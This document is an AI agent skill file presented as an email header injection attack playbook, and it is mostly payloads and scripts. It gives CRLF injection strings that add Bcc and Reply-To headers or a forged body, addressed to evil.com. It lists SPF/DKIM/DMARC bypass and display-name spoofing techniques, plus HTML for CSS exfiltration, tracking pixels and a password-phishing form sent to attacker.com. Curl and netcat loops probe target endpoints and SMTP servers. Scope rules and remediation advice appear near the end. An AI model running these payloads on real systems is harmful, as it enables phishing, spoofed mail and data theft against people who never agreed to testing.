---
name: email-header-injection
description: >-
  Email header injection and spoofing playbook. Use when testing contact forms, email APIs, password reset flows, or any feature that constructs SMTP messages with user-controlled fields. Covers CRLF injection in headers, SPF/DKIM/DMARC bypass, and phishing amplification.
---

# SKILL: Email Header Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert email header injection and authentication bypass. Covers SMTP CRLF injection, SPF/DKIM/DMARC circumvention, display name spoofing, and mail client rendering abuse. Base models miss the nuance between header injection (technical) and email auth bypass (protocol-level) — this skill covers both attack surfaces.

## 0. RELATED ROUTING

- [crlf-injection](../crlf-injection/SKILL.md) — general CRLF injection; email headers are a specific high-value sink
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) — when SMTP server is reachable via SSRF (gopher://smtp)
- [open-redirect](../open-redirect/SKILL.md) — redirect in password-reset emails as phishing amplification

---

## 1. SMTP HEADER INJECTION FUNDAMENTALS

SMTP headers are separated by CRLF (`\r\n`). If user input is placed into email headers without sanitization, injecting `%0d%0a` (or `\r\n`) adds arbitrary headers.

### Injection anatomy

```
Normal header construction:
  To: user@example.com\r\n
  Subject: Contact Form\r\n
  From: noreply@target.com\r\n

Injected (via Subject field):
  Subject: Hello%0d%0aBcc: attacker@evil.com\r\n
  
Result:
  Subject: Hello\r\n
  Bcc: attacker@evil.com\r\n
```

### Encoding variants to try

| Encoding | Payload |
|---|---|
| URL-encoded | `%0d%0a` |
| Double URL-encoded | `%250d%250a` |
| Unicode | `\u000d\u000a` |
| Raw CRLF | `\r\n` (in raw request) |
| LF only | `%0a` (some SMTP servers accept LF without CR) |
| Null byte + CRLF | `%00%0d%0a` |

---

## 2. ATTACK SCENARIOS

### 2.1 BCC Injection — Silent Email Exfiltration

```
Input field: email / name / subject
Payload: victim@target.com%0d%0aBcc:attacker@evil.com

Effect: attacker receives a copy of every email sent through this form
```

### 2.2 CC Injection with Header Stacking

```
Payload in "From name" field:
  John%0d%0aCc:attacker@evil.com%0d%0aBcc:spy@evil.com

Result headers:
  From: John
  Cc: attacker@evil.com
  Bcc: spy@evil.com
  ... (original headers continue)
```

### 2.3 Body Injection — Full Email Content Control

A blank line (`\r\n\r\n`) separates headers from body in SMTP:

```
Payload in Subject:
  Urgent%0d%0a%0d%0aPlease click: https://evil.com/phish%0d%0a.%0d%0a

Result:
  Subject: Urgent
  
  Please click: https://evil.com/phish
  .
  
(Blank line terminates headers, everything after is body)
```

### 2.4 Reply-To Manipulation for Phishing

```
Payload in From name:
  IT Support%0d%0aReply-To:attacker@evil.com

Victim sees "IT Support" as sender
Replies go to attacker@evil.com
```

### 2.5 Content-Type Injection for HTML Phishing

```
Payload:
  test%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Password Reset</h1><a href="https://evil.com">Click here</a>

Overrides Content-Type → renders HTML in email client
```

---

## 3. COMMON VULNERABLE PATTERNS

### PHP mail()

```php
$to = $_POST['email'];
$subject = $_POST['subject'];
$message = $_POST['message'];
$headers = "From: noreply@target.com";

// ALL parameters are injectable:
mail($to, $subject, $message, $headers);

// $to injection:    victim@x.com%0d%0aCc:attacker@evil.com
// $subject injection: Hello%0d%0aBcc:attacker@evil.com
// $headers injection: From: x%0d%0aBcc:attacker@evil.com
```

### Python smtplib

```python
msg = f"From: {user_from}\r\nTo: {user_to}\r\nSubject: {user_subject}\r\n\r\n{body}"
server.sendmail(from_addr, to_addr, msg)
# user_from / user_subject injectable if not sanitized
```

### Node.js nodemailer

```javascript
let mailOptions = {
    from: req.body.from,      // injectable
    to: 'admin@target.com',
    subject: req.body.subject, // injectable
    text: req.body.message
};
transporter.sendMail(mailOptions);
```

---

## 4. SPF / DKIM / DMARC BYPASS TECHNIQUES

### 4.1 SPF (Sender Policy Framework) Bypass

SPF validates the `MAIL FROM` envelope sender IP against DNS TXT records.

| Technique | How |
|---|---|
| Subdomain delegation | Target has `include:_spf.google.com`; attacker uses Google Workspace to send as `anything@mail.target.com` |
| Include chain abuse | `v=spf1 include:third-party.com` — if third-party allows broad sending |
| DNS lookup limit (10) | SPF allows max 10 DNS lookups; chains exceeding this → `permerror` → some receivers accept |
| `+all` misconfiguration | `v=spf1 +all` allows any IP (rare but exists) |
| `?all` or `~all` | Softfail/neutral → most receivers still deliver to inbox |
| No SPF record | Domain without SPF → anyone can send as that domain |

```bash
# Check SPF record:
dig TXT target.com +short
# Look for: v=spf1 ...

# Count DNS lookups (each include/a/mx/redirect = 1 lookup):
# >10 lookups = permerror = bypassed
```

### 4.2 DKIM (DomainKeys Identified Mail) Bypass

DKIM signs specific headers with a domain key. Bypass vectors:

| Technique | How |
|---|---|
| `d=` vs `From:` mismatch | DKIM signs with `d=subdomain.target.com` but `From: ceo@target.com` — valid DKIM, spoofed From |
| `l=` tag abuse | `l=` limits body length signed; attacker appends content after signed portion |
| Replay attack | Capture valid DKIM-signed email, resend with modified unsigned headers |
| Missing `h=from` | If `from` header not in signed headers list (`h=`), From can be modified |
| Key rotation window | During DKIM key rotation, old selector may still validate |

```bash
# Check DKIM selector:
dig TXT selector._domainkey.target.com +short
# Common selectors: google, default, s1, s2, k1, dkim
```

### 4.3 DMARC (Domain-based Message Authentication) Bypass

DMARC requires SPF or DKIM to **align** with the `From:` header domain.

| Technique | How |
|---|---|
| Relaxed alignment (`aspf=r`) | SPF passes for `sub.target.com`, DMARC accepts for `target.com` |
| Organizational domain | `mail.target.com` aligns with `target.com` in relaxed mode |
| No DMARC record | Domain without DMARC → no policy enforcement |
| `p=none` | DMARC exists but policy is `none` → no enforcement, just reporting |
| Subdomain policy (`sp=none`) | Main domain `p=reject` but `sp=none` → subdomains spoofable |

```bash
# Check DMARC:
dig TXT _dmarc.target.com +short
# Look for: v=DMARC1; p=none/quarantine/reject
```

### 4.4 Display Name Spoofing (Works Everywhere)

Even with perfect SPF/DKIM/DMARC, display name is not authenticated:

```
From: "admin@target.com" <attacker@evil.com>
From: "IT Security Team - target.com" <random@evil.com>
From: "noreply@target.com via Support" <attacker@evil.com>
```

Most email clients show only the display name in the inbox view. Mobile clients are especially vulnerable.

---

## 5. MAIL CLIENT RENDERING ATTACKS

### CSS-based data exfiltration

```html
<!-- In HTML email body -->
<style>
  #secret[value^="a"] { background: url('https://attacker.com/leak?char=a'); }
  #secret[value^="b"] { background: url('https://attacker.com/leak?char=b'); }
</style>
<input id="secret" value="TARGET_VALUE">
```

### Remote image tracking

```html
<img src="https://attacker.com/track?email=victim@target.com&t=TIMESTAMP" width="1" height="1">
<!-- Invisible pixel — confirms email was opened, leaks IP, client info -->
```

### Form action hijacking

```html
<!-- Some email clients render forms -->
<form action="https://attacker.com/phish" method="POST">
  <input name="password" type="password" placeholder="Confirm your password">
  <button type="submit">Verify</button>
</form>
```

---

## 6. CONTACT FORM / EMAIL API INJECTION

```text
# REST API
POST /api/send-email {"to":"user@target.com\r\nBcc:attacker@evil.com","subject":"Hello","body":"Test"}

# URL-encoded form
name=John&email=victim%40target.com%0d%0aBcc%3aattacker%40evil.com&message=test

# GraphQL
mutation { sendEmail(to:"user@target.com\r\nBcc:attacker@evil.com" subject:"Test" body:"Hello") }
```

---

## 7. TESTING METHODOLOGY

```
1. Find email features: contact forms, password reset, invite/share, newsletters
2. Test CRLF: inject test%0d%0aX-Injected:true in each field → check received headers
3. Escalate: Bcc injection → body injection → Content-Type override
4. Parallel: dig TXT target.com (SPF) + dig TXT _dmarc.target.com (DMARC)
```

---

## 8. DECISION TREE

```
Found email-sending feature?
│
├── User input goes into email headers?
│   ├── YES → Test CRLF injection
│   │   ├── %0d%0a in Subject/From/To field
│   │   │   ├── Extra header appears → CONFIRMED
│   │   │   │   ├── Inject Bcc: → silent exfiltration
│   │   │   │   ├── Inject body (blank line) → content control
│   │   │   │   └── Inject Reply-To: → redirect replies
│   │   │   │
│   │   │   └── Filtered? → Try encoding variants
│   │   │       ├── %250d%250a (double encode)
│   │   │       ├── %0a only (LF without CR)
│   │   │       └── Unicode \u000d\u000a
│   │   │
│   │   └── All encodings blocked → check SPF/DKIM/DMARC
│   │
│   └── NO (user input only in body) → limited impact
│       └── Check for HTML injection in email body
│           └── If HTML rendered → phishing / CSS exfil
│
├── Want to spoof emails from target domain?
│   ├── Check SPF: dig TXT target.com
│   │   ├── No SPF / +all / ~all → direct spoofing possible
│   │   └── -all → SPF blocks; check DKIM/DMARC
│   │
│   ├── Check DMARC: dig TXT _dmarc.target.com
│   │   ├── No DMARC / p=none → spoofing delivered
│   │   ├── p=quarantine → lands in spam but delivered
│   │   └── p=reject → blocked; try subdomain (sp= policy)
│   │
│   └── All strict → Display name spoofing only
│       └── "admin@target.com" <attacker@evil.com>
│
└── Testing password reset email?
    ├── Check for token in URL → open redirect chain?
    │   └── See ../open-redirect/SKILL.md
    └── Check for host header injection → password reset poisoning
        └── See ../http-host-header-attacks/SKILL.md
```

---

## 9. QUICK REFERENCE — KEY PAYLOADS

```text
# BCC injection via Subject
Subject: Hello%0d%0aBcc:attacker@evil.com

# Body injection via From name
From: Test%0d%0a%0d%0aClick here: https://evil.com

# Reply-To hijack
From: Support%0d%0aReply-To:attacker@evil.com

# Full header stack injection
email=victim%40target.com%0d%0aCc%3aspy1%40evil.com%0d%0aBcc%3aspy2%40evil.com

# Display name spoof (no injection needed)
From: "security@target.com" <attacker@evil.com>
```

---

## 10. EXECUTION PRIMITIVES

Email header injection is proven by **a message arriving with a header, recipient, or body you
supplied**. The evidence is the delivered message, not the HTTP response.

### 10.1 Make the injection visible: a mailbox you control

```bash
# every test needs a destination you can read. point the injected recipient at it.
INBOX="inject-test@YOUR_DOMAIN"
COLLAB="http://COLLAB/mail-oob"
# baseline: does the form send at all?
curl -sS -o /tmp/m0 -w '%{http_code}\n' -X POST "https://target.tld/api/contact" \
  -H 'Content-Type: application/json' \
  -d '{"email":"me@YOUR_DOMAIN","subject":"baseline","message":"baseline body"}'
head -c 200 /tmp/m0; echo
```

If the baseline does not arrive, the injection test proves nothing - **fix the delivery path before
testing the injection**.

### 10.2 Newline injection into the recipient and subject

```bash
# CRLF and LF, in the envelope fields, with the injected recipient being yours
for NL in '%0d%0a' '%0a' '%0d'; do
  P="me@YOUR_DOMAIN${NL}Bcc:${INBOX}"
  echo "=== separator $NL"
  curl -sS -o /tmp/n -w '%{http_code}\n' -X POST "https://target.tld/api/contact" \
    -H 'Content-Type: application/json' -d "{\"email\":\"$P\",\"subject\":\"t\",\"message\":\"t\"}"
  head -c 150 /tmp/n; echo
done
```

A message arriving **at `$INBOX`** proves the header injection. The Bcc form is the safest proof: it
creates no visible artefact on a third party and demonstrates full control of the recipient list.

### 10.3 Full message control through the body parameter

```bash
# inject a complete second message after the body, so the target sends mail you authored
BODY="hello%0d%0a%0d%0aSecond message body%0d%0a.\r\n"
curl -sS -o /tmp/b -w '%{http_code}\n' -X POST "https://target.tld/api/contact" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "email=me@YOUR_DOMAIN" \
  --data-urlencode "subject=test" \
  --data-urlencode "message=line1
line2
Bcc: ${INBOX}
Content-Type: text/html

<b>injected</b>"
grep -icE 'sent|queued|ok' /tmp/b
```

This is the strongest form: **the target becomes an open mail relay for the injected content**, which
is a phishing and reputation finding as well as an injection. Test it against the recipient address the
form claims to send to, and check whether the injected `Content-Type` changed the rendering.

### 10.4 Test every field, and the multipart path

```bash
# form fields, not just the obvious ones
for F in email to from reply-to name subject message body comment phone cc; do
  curl -sS -o /dev/null -X POST "https://target.tld/api/contact" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "$F=me@YOUR_DOMAIN%0d%0aBcc: ${INBOX}"
done
# and multipart, where a filename or a part header can carry the injection
printf 'x' > /tmp/f.txt
curl -sS -o /dev/null -X POST "https://target.tld/api/contact" \
  -F "email=me@YOUR_DOMAIN" -F "subject=t" -F "attachment=@/tmp/f.txt;filename=me@YOUR_DOMAIN%0d%0aBcc: ${INBOX}"
sleep 5; echo "check $INBOX for which field produced the message"
```

**One field per request, with a distinct marker in each**, tells you which parameter reaches a header.
The multipart filename path is frequently overlooked and frequently injectable.

### 10.5 Test the SMTP conversation directly when you can reach the server

```bash
# if the app exposes an SMTP endpoint (its own MTA) and you are in scope, converse with it
{ printf 'EHLO test\r\n'; sleep 1
  printf 'MAIL FROM:<me@YOUR_DOMAIN>\r\n'; sleep 1
  printf 'RCPT TO:<%s>\r\n' "$INBOX"; sleep 1
  printf 'DATA\r\n'; sleep 1
  printf 'Subject: direct-test\r\nX-Injected: yes\r\n\r\nbody\r\n.\r\n'; sleep 1
  printf 'QUIT\r\n'; } | nc target-smtp.tld 25
```

This establishes the **SMTP conversation grammar** and shows whether the server accepts injected
headers, without involving the application. Useful for confirming that the finding is in the mail path
rather than a specific form.

### 10.6 Header injection through HTTP parameters into SMTP

```bash
# mail-sending APIs often forward a header value verbatim; test each header-bearing parameter
curl -sS -o /tmp/h -w '%{http_code}\n' -X POST "https://target.tld/api/invite" \
  -H 'Content-Type: application/json' \
  -d "{\"to\":\"me@YOUR_DOMAIN\",\"fromName\":\"Name\r\nBcc: ${INBOX}\",\"subject\":\"invite\"}"
head -c 150 /tmp/h; echo
# and the Reply-To / Return-Path paths
curl -sS -o /dev/null -X POST "https://target.tld/api/invite" \
  -H 'Content-Type: application/json' \
  -d "{\"to\":\"me@YOUR_DOMAIN\",\"replyTo\":\"x@YOUR_DOMAIN\r\nBcc: ${INBOX}\"}"
sleep 5; echo "check $INBOX"
```

Display names and `Reply-To` values are the parameters most often concatenated into a header without
validation, because they are expected to contain arbitrary text.

### 10.7 SPF/DKIM/DMARC: test the assertion, do not assume it

```bash
D="YOUR_DOMAIN"
echo "--- SPF";  dig +short TXT "$D" | grep -i spf
echo "--- DMARC"; dig +short TXT "_dmarc.$D"
echo "--- DKIM selectors"
for S in default google selector1 selector2 mail dkim s1 k1; do
  R=$(dig +short TXT "$S._domainkey.$D")
  [ -n "$R" ] && echo "$S -> $R"
done
echo "--- enforcement"
dig +short TXT "_dmarc.$D" | grep -oiE 'p=(none|quarantine|reject)'
```

`p=none` means DMARC is **reporting only** - spoofing is not blocked, which changes the finding's
severity. **A missing SPF record or a `~all` with no DMARC enforcement is the finding**, and it is
proved by the records themselves. To prove alignment failure end-to-end you need a message that was
delivered despite failing alignment, which requires a mailbox you control and the raw headers.

### 10.8 Header injection into other protocols that reuse the pattern

```bash
# the same CRLF technique applies wherever user input reaches a header stream
echo "--- HTTP response splitting via a location parameter"
curl -sS -D- -o /dev/null "https://target.tld/redirect?url=https://ok.tld%0d%0aSet-Cookie:%20injected=1"
echo "--- log injection"
curl -sS -o /dev/null "https://target.tld/?q=line1%0aFAKE%20LOG%20ENTRY"
curl -sS -D- -o /dev/null "https://target.tld/redirect?url=https://ok.tld%0aX-Injected:%20yes"
```

The same primitive appears in HTTP response splitting, log forging, and IMAP/SMTP command injection.
**If CRLF is not filtered in one header context, it is usually unfiltered in the others** - test them
together and report the class.

---

## 11. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did a message **arrive at an address you injected**, that the application did not intend to send to? | the injection, with unambiguous proof |
| 2 | Which **field** carried the injection - identified by a per-field marker? | the fix location |
| 3 | Was a **header or body** you supplied present in the delivered message (inspect raw source)? | the extent of control |
| 4 | Did the response indicate **success** while the injected recipient received the mail? | the application did not validate, it merely formatted |
| 5 | Can the injected content be **used for phishing** (a body and links you control)? | severity: relay, not just injection |
| 6 | What are the **SPF/DKIM/DMARC** records, and does the injected mail pass alignment? | deliverability and severity |
| 7 | Is the endpoint **unauthenticated**? | severity |

**The delivered message is the finding.** A `200` response from a contact form proves nothing about
whether an injected header was honoured; the mailbox is the oracle.

---

## 12. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **request** with the exact CRLF encoding, and the field it was placed in | reproducible, and it localises the fix |
| The **delivered message** - the raw source with headers and the arrival timestamp at your mailbox | the only proof the injection was honoured |
| The **injected recipient** being a mailbox you control | it makes the proof unambiguous and third-party-safe |
| The **injected header or body content visible in the raw message** | proves the extent of control, not just the recipient |
| Which **field** injected, when several were tested | driven by per-field markers |
| The **SPF/DKIM/DMARC records** for the sending domain, with the enforcement level | spoofing severity depends on them |
| For a **relay** claim: the message body you authored arriving intact | the strongest form |
| **Negative control** - a normal request delivers a normal message to the intended recipient only | shows the difference is caused by the CRLF |
| Confirmation that **no bulk mail was sent and no third party received messages** | scope and ethics discipline |
| The **SMTP path** (application, relay, or library) that mishandled the value, where identifiable | the fix owner |

Report the **injected field and the delivered message**: "the `fromName` parameter of
`POST /api/invite` is interpolated into the `From` header without CRLF filtering; sending
`fromName: "Name\r\nBcc: inject-test@my-domain.tld"` produced a message that arrived at
`inject-test@my-domain.tld` with the intended recipient still in `To:`, proving full recipient-list
control; `YOUR_DOMAIN` publishes `v=spf1 ~all` and DMARC `p=none`, so spoofed mail is not rejected",
never "the contact form is vulnerable to email header injection".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A `200` response with no message arriving | nothing was sent |
| The CRLF appears in the response body, reflected | reflection, not SMTP |
| A message arriving at the **intended** recipient only | you did not control the recipient |
| The injected text appears in the subject but the recipient is unchanged | header text injection with no recipient control - report precisely |
| A message your own mail client sent while testing | your client, not the target |
| A bounced message from an injected address that was rejected | the injection was filtered or the MTA refused |
| SPF/DKIM failure with no delivered message | an unproven assumption |
| An injection point that requires an authenticated admin role and sends only to the admin | low impact, report precisely |
| Header injection into a field the library encodes correctly, with no effect | the library sanitised it |
| A message queued but never delivered, with no SMTP acceptance recorded | unproven |
| Bulk sending to demonstrate the relay | an incident - never do this |
| A finding on a domain outside scope | scope violation |

**Send to yourself, once, and read the raw source.** Every other form of proof is weaker or unsafe.

---

## 13. REMEDIATION REFERENCE

1. **Use a mail library that takes structured fields and constructs the message itself** - `mail()`-style string concatenation is the root cause, and a library with a structured API makes CRLF injection structurally impossible.
2. **Reject control characters in every field that reaches a header** - strip or reject `\r`, `\n`, and their encoded forms before the value leaves the application, at the validation layer rather than the mail layer.
3. **Validate recipient addresses against a strict address grammar** - a single RFC-shaped address with no whitespace or control characters removes the recipient-injection path.
4. **Never interpolate user input into a header value without encoding** - display names especially must be encoded as RFC 2047 encoded-words, not concatenated raw.
5. **Rate-limit and CAPTCHA the mail-sending endpoints** - injection turns a contact form into a relay; a rate limit caps the damage and the reputation risk while the code is fixed.
6. **Restrict where the mail path can deliver** - a relay that will only send to internal or verified addresses cannot be used for arbitrary third-party phishing.
7. **Publish and enforce SPF, DKIM, and DMARC with `p=reject`** - enforcement does not stop the injection, but it stops the injected mail from being deliverable to third parties, which is most of the impact.
8. **Separate the application from the SMTP send path** - use a provider API with structured fields instead of a local `sendmail`, which removes the raw-header opportunity entirely.
9. **Log and alert on control characters in submitted form fields** - a CRLF in a contact form is never legitimate, so it is a high-signal detection rule.
10. **Encode output side: escape headers when rendering a message for display** - the mail client rendering attacks (`Subject:` with HTML) are a second, separate mitigation.
11. **Add a test asserting a CRLF-bearing field is rejected** - one assertion per mail-sending endpoint detects this class and its regressions.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [crlf-injection](../crlf-injection/SKILL.md) - the same primitive in HTTP response headers
- [xss-cross-site-scripting](../xss-exploitation-chains/SKILL.md) - the HTML rendering half of mail client attacks
- [open-redirect](../open-redirect/SKILL.md) - the link component of a phishing message
- [dangling-markup-injection](../dangling-markup-injection/SKILL.md) - the HTML-parsing techniques that apply in a mail client
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) - encoding variants that survive filters
